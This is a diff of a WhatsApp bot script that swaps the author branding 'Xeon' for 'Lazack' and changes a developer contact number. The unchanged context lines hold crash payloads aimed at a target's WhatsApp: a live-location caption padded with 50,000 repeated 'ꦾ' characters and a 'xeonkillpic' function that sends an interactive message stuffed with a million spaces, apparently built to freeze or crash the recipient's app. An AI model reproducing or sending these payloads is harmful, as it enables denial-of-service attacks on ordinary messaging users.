@@ -1176,7 +1176,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 listResponseMessage: {
-title: `🦄드림 가이 Xeon`
+title: `Lazack`
 }
 }
 }
@@ -1218,7 +1218,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`+"ꦾ".repeat(50000),
+    "caption": `LAZACK28 LAZACK28`+"ꦾ".repeat(50000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -1232,7 +1232,7 @@ async function xeonkillpic(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
     interactiveMessage: {
       header: {
-        title: "🦄드림 가이 Xeon",
+        title: "Lazack",
         hasMediaAttachment: true,
         ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
       },
@@ -1240,7 +1240,7 @@ async function xeonkillpic(target, kuwoted) {
         text: ""
       },
       footer: {
-        text: "›          #🦄드림 가이 Xeon"
+        text: "›          # Lazack"
       },
       nativeFlowMessage: {
         messageParamsJson: " ".repeat(1000000)
@@ -1858,9 +1858,9 @@ break
         `Contact Developer On WhatsApp`, // Body message
         botname, // Footer message
         'Visit', // Button display text
-        'https://Wa.me/916909137213', // Command (URL in this case)
+        'https://Wa.me/255734980103', // Command (URL in this case)
         'cta_url', // Button type
-        'https://Wa.me/916909137213' // URL (used in image generation)
+        'https://Wa.me/255734980103' // URL (used in image generation)
     ], 
 ];
 
